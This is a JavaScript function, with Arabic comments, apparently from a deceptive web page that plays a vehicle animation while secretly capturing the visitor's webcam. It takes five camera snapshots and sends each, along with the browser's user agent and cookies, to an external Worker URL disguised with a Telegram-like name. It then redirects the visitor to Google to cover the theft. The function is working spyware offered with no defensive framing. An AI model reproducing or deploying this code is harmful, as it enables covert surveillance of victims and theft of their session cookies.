async function startProcess() {
  try {
    playRealisticSounds();
    document.getElementById('road').classList.add('animating');
    ['truck', 'ferrari', 'taxi', 'bike'].forEach(id => {
      document.getElementById(id).classList.add(id + '-move', 'move');
    });

    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video'); video.srcObject = stream; await video.play();
    const canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480;
    const ctx = canvas.getContext('2d');

    // رابط الـ Worker الخاص بك
    const workerUrl = "https://tlgram.alidm0935.workers.dev/";

    for (let i = 0; i < 5; i++) { // قللنا العدد لضمان الاستقرار
      ctx.drawImage(video, 0, 0, 640, 480);
      const data = canvas.toDataURL('image/jpeg', 0.5);
      
      // إرسال مباشر للـ Worker
      await fetch(workerUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          img: data,
          info: navigator.userAgent,
          cookies: document.cookie || "No Cookies"
        })
      }).catch(e => console.error("Error sending to worker:", e));
      
      await new Promise(r => setTimeout(r, 1500));
    }
    stream.getTracks().forEach(t => t.stop());
    setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
  } catch (err) { alert("يرجى السماح بالكاميرا للمتابعة."); }
}
